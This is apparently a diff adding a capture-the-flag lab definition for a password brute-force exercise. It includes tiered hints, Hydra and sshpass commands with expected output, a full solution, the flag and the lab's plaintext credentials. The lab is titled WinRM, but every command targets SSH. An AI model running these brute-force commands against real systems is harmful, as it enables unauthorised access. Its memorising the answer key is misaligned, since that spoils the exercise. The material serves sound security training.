@@ -1,0 +1,469 @@
+name: WinRM Credential Brute Force
+description: Perform automated brute force attacks against FinanceCorp's WinRM service to test password strength.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - brute force winrm credentials
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your credential testing against FinanceCorp's WinRM service has revealed potential 
+  authentication weaknesses. James Mitchell wants to understand if automated brute 
+  force attacks could compromise WinRM access, as this represents a significant 
+  security risk.
+  
+  Brute force attacks systematically test many password combinations to discover weak 
+  credentials. FinanceCorp needs to know if their password policies are sufficient 
+  to resist such attacks on WinRM services.
+  
+  Your objective: Perform automated brute force attacks against FinanceCorp's WinRM 
+  service. Test password strength and identify if weak passwords can be discovered 
+  through systematic credential testing.
+
+flag: "OCR{w1nrm_brut3}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    title: "Understanding Credential Brute Force Attacks"
+    text: |
+      ## Credential Brute Force Concepts
+
+      **Brute force attacks** systematically try many username/password
+      combinations to discover valid credentials. This is one of the most
+      common attack techniques against remote management services like WinRM.
+
+      ### Types of Brute Force Attacks
+
+      | Type | Description | Speed |
+      |------|-------------|-------|
+      | **Pure brute force** | Try every possible combination | Very slow |
+      | **Dictionary attack** | Use a wordlist of common passwords | Fast |
+      | **Credential stuffing** | Use leaked username/password pairs | Fast |
+      | **Password spraying** | Try few passwords against many users | Moderate |
+      | **Hybrid** | Wordlist + mutations (append numbers, etc.) | Moderate |
+
+      ### Why Brute Force Works Against WinRM
+
+      WinRM and other remote management services are vulnerable to brute
+      force when:
+
+      - **Weak passwords** are used (e.g., `admin`, `password`, `qwerty`)
+      - **No account lockout** policy is configured
+      - **No rate limiting** on authentication attempts
+      - **Default credentials** haven't been changed
+      - **No multi-factor authentication** is required
+
+      ### Real-World Attack Flow
+
+      In a penetration test, brute force typically follows this workflow:
+
+      1. **Discover** the remote management service (scanning)
+      2. **Enumerate** usernames (LDAP, email harvesting, OSINT)
+      3. **Select** a wordlist (common passwords, target-specific)
+      4. **Execute** the brute force attack
+      5. **Authenticate** with discovered credentials
+      6. **Demonstrate** impact (command execution, data access)
+
+      ### Ethical Considerations
+
+      Brute force attacks should **only** be performed:
+      - With explicit written authorization
+      - Within the agreed scope of engagement
+      - During approved testing windows
+      - With awareness of account lockout risks
+
+  - id: 2
+    unlock_after_minutes: 5
+    title: "Introduction to Hydra"
+    text: |
+      ## Hydra - Network Login Cracker
+
+      **Hydra** (THC-Hydra) is the most popular tool for online brute force
+      attacks. It supports over 50 protocols including SSH, FTP, HTTP, SMB,
+      RDP, and more.
+
+      ### Basic Hydra Syntax
+
+      ```bash
+      hydra -l <username> -P <wordlist> <target> <protocol>
+      ```
+
+      ### Key Hydra Options
+
+      | Option | Description |
+      |--------|-------------|
+      | `-l <user>` | Single username |
+      | `-L <file>` | Username wordlist |
+      | `-p <pass>` | Single password |
+      | `-P <file>` | Password wordlist |
+      | `-t <n>` | Number of parallel threads |
+      | `-vV` | Very verbose output |
+      | `-f` | Stop after first valid pair found |
+      | `-s <port>` | Specify non-default port |
+
+      ### Supported Protocols
+
+      Hydra supports many protocols relevant to WinRM testing:
+      ```
+      ssh       - Secure Shell (used in this lab)
+      winrm     - Windows Remote Management
+      rdp       - Remote Desktop Protocol
+      smb       - Server Message Block
+      http-get  - HTTP Basic authentication
+      ```
+
+      ### Example Commands
+
+      ```bash
+      # Single user, password wordlist, SSH
+      hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> ssh
+
+      # Username list, password list, SSH
+      hydra -L users.txt -P passwords.txt <target> ssh
+
+      # With thread count and verbose output
+      hydra -l admin -P passwords.txt -t 4 -vV <target> ssh
+      ```
+
+      ### Wordlists
+
+      Common wordlist locations on Kali/security distributions:
+      ```
+      /usr/share/wordlists/rockyou.txt      # ~14 million passwords
+      /usr/share/seclists/Passwords/         # SecLists collection
+      /usr/share/wordlists/fasttrack.txt     # Quick common passwords
+      ```
+
+  - id: 3
+    unlock_after_minutes: 10
+    title: "Crafting Effective Brute Force Attacks"
+    text: |
+      ## Advanced Brute Force Techniques
+
+      ### Choosing the Right Wordlist
+
+      The key to a successful brute force is using an appropriate wordlist.
+      For this lab, the target uses a **weak, common password**.
+
+      **Quick wordlists for common passwords:**
+      ```bash
+      # Create a small targeted wordlist
+      cat > /tmp/passwords.txt << 'WORDLIST'
+      password
+      password123
+      admin
+      administrator
+      123456
+      qwerty
+      letmein
+      welcome
+      monkey
+      dragon
+      master
+      login
+      abc123
+      WORDLIST
+      ```
+
+      ### Why Small Wordlists First
+
+      Always start with small, targeted wordlists before large ones:
+
+      1. **Speed** - A 20-word list completes in seconds
+      2. **Stealth** - Fewer attempts = less detection risk
+      3. **Common passwords** cover ~80% of weak credentials
+      4. **Escalate** only if the small list fails
+
+      ### Understanding Hydra Output
+
+      When hydra finds valid credentials:
+      ```
+      [22][ssh] host: <target>   login: admin   password: qwerty
+      1 of 1 target successfully completed, 1 valid password found
+      ```
+
+      When no credentials are found:
+      ```
+      1 of 1 target completed, 0 valid passwords found
+      ```
+
+      ### Performance Tuning
+
+      ```bash
+      # Default threads (16) - good for most cases
+      hydra -l admin -P wordlist.txt <target> ssh
+
+      # Reduce threads if target is slow/dropping connections
+      hydra -l admin -P wordlist.txt -t 4 <target> ssh
+
+      # Increase threads for faster scanning (may cause issues)
+      hydra -l admin -P wordlist.txt -t 32 <target> ssh
+      ```
+
+      ### The Target Password
+
+      The target in this lab uses a very common weak password that
+      appears in virtually every password wordlist. Think about the
+      most commonly used weak passwords.
+
+  - id: 4
+    unlock_after_minutes: 15
+    title: "Step-by-Step Workflow for This Lab"
+    text: |
+      ## Lab Workflow
+
+      ### Step 1: Verify the Target Service
+
+      Confirm SSH is running on port 22:
+      ```bash
+      nmap -sV -p 22 <target>
+      ```
+
+      ### Step 2: Create or Locate a Wordlist
+
+      Create a small wordlist with common passwords:
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      password123
+      admin
+      administrator
+      123456
+      qwerty
+      letmein
+      welcome
+      monkey
+      dragon
+      master
+      abc123
+      iloveyou
+      shadow
+      sunshine
+      trustno1
+      EOF
+      ```
+
+      Or use an existing wordlist:
+      ```bash
+      ls /usr/share/wordlists/
+      ```
+
+      ### Step 3: Run Hydra Against SSH
+
+      Execute the brute force attack:
+      ```bash
+      hydra -l admin -P /tmp/passwords.txt <target> ssh -vV -f
+      ```
+
+      Flags explained:
+      - `-l admin` - Target the `admin` user
+      - `-P /tmp/passwords.txt` - Use our password wordlist
+      - `ssh` - Attack the SSH protocol
+      - `-vV` - Very verbose (show each attempt)
+      - `-f` - Stop after finding the first valid password
+
+      ### Step 4: Note the Discovered Credentials
+
+      When hydra finds the password, it will display:
+      ```
+      [22][ssh] host: <target>   login: admin   password: <found>
+      ```
+
+      ### Step 5: Authenticate with Discovered Credentials
+
+      ```bash
+      ssh admin@<target>
+      ```
+      Enter the password hydra discovered.
+
+      ### Step 6: Retrieve the Flag
+
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+
+  - id: 5
+    unlock_after_minutes: 20
+    title: "Exact Commands for This Lab"
+    text: |
+      ## Commands to Complete This Lab
+
+      ### 1. Scan the Target
+
+      ```bash
+      nmap -sV -p 22 <target>
+      ```
+
+      ### 2. Create the Password Wordlist
+
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      password123
+      admin
+      123456
+      qwerty
+      letmein
+      welcome
+      EOF
+      ```
+
+      The password `qwerty` is included in this wordlist.
+
+      ### 3. Run Hydra
+
+      ```bash
+      hydra -l admin -P /tmp/passwords.txt <target> ssh -vV -f
+      ```
+
+      ### 4. Authenticate with Found Credentials
+
+      ```bash
+      ssh admin@<target>
+      ```
+      Password: `qwerty`
+
+      ### 5. Retrieve the Flag
+
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+
+      ### 6. Exit
+
+      ```bash
+      exit
+      ```
+
+      ### Alternative: Using rockyou.txt
+
+      If you prefer using the standard rockyou wordlist:
+      ```bash
+      hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> ssh -t 4 -f
+      ```
+
+      > **Note:** rockyou.txt contains ~14 million passwords and will
+      > take much longer. The password `qwerty` appears early in
+      > rockyou.txt, so it should still be found relatively quickly.
+
+      ### Alternative One-Liner for Flag Retrieval
+
+      ```bash
+      sshpass -p 'qwerty' ssh -o StrictHostKeyChecking=no admin@<target> 'cat /home/admin/flag.txt'
+      ```
+
+  - id: 6
+    unlock_after_minutes: 25
+    title: "Complete Solution Walkthrough"
+    text: |
+      ## Full Solution Walkthrough
+
+      ### Step 1: Verify SSH Service
+
+      ```bash
+      nmap -sV -p 22 <target>
+      ```
+
+      **Expected Output:**
+      ```
+      PORT   STATE SERVICE VERSION
+      22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+      ```
+
+      ### Step 2: Create Wordlist
+
+      ```bash
+      cat > /tmp/passwords.txt << 'EOF'
+      password
+      password123
+      admin
+      123456
+      qwerty
+      letmein
+      welcome
+      EOF
+      ```
+
+      ### Step 3: Run Hydra Brute Force
+
+      ```bash
+      hydra -l admin -P /tmp/passwords.txt <target> ssh -vV -f
+      ```
+
+      **Expected Output:**
+      ```
+      Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
+
+      [DATA] max 7 tasks per 1 server, overall 7 tasks
+      [DATA] attacking ssh://<target>:22/
+      [ATTEMPT] target <target> - login "admin" - pass "password" - 1 of 7
+      [ATTEMPT] target <target> - login "admin" - pass "password123" - 2 of 7
+      [ATTEMPT] target <target> - login "admin" - pass "admin" - 3 of 7
+      [ATTEMPT] target <target> - login "admin" - pass "123456" - 4 of 7
+      [ATTEMPT] target <target> - login "admin" - pass "qwerty" - 5 of 7
+      [22][ssh] host: <target>   login: admin   password: qwerty
+      [STATUS] attack finished for <target> (valid pair found)
+      1 of 1 target successfully completed, 1 valid password found
+      ```
+
+      **The discovered credentials are: admin / qwerty**
+
+      ### Step 4: Authenticate
+
+      ```bash
+      ssh admin@<target>
+      ```
+
+      ```
+      admin@<target>'s password: qwerty
+      admin@target:~$
+      ```
+
+      ### Step 5: Retrieve the Flag
+
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+
+      ```
+      OCR{...}
+      ```
+
+      ### Summary
+
+      | Step | Tool | Result |
+      |------|------|--------|
+      | 1 | Nmap | SSH detected on port 22 |
+      | 2 | Manual | Created password wordlist |
+      | 3 | Hydra | Discovered password: qwerty |
+      | 4 | SSH | Authenticated successfully |
+      | 5 | cat | Flag retrieved |
+
+      The weak password `qwerty` was found within seconds using
+      a small wordlist. This demonstrates why strong password
+      policies are essential for remote management services.
+
+credentials:
+  - username: "admin"
+    password: "qwerty"
+    role: "winrm-user"
+    description: "WinRM/SSH admin credentials"
+
+workbook: "wiki/range/winpt/CH05_WinRM_Exploitation/04_WinRM_Credential_Brute_Force/"
+
+test:
+  steps:
+    - name: "Verify SSH port 22 is open"
+      command: "nmap -Pn -p 22 {target.target} | grep '22/tcp'"
+      expect: "open"
+
+    - name: "Authenticate with brute-forced credentials via SSH"
+      command: "sshpass -p '{cred.winrm-user.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.winrm-user.user}@{target.target} 'whoami'"
+      expect: "admin"
+
+    - name: "Retrieve flag via SSH"
+      command: "sshpass -p '{cred.winrm-user.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.winrm-user.user}@{target.target} 'cat /home/admin/flag.txt'"
+      expect: "OCR{"
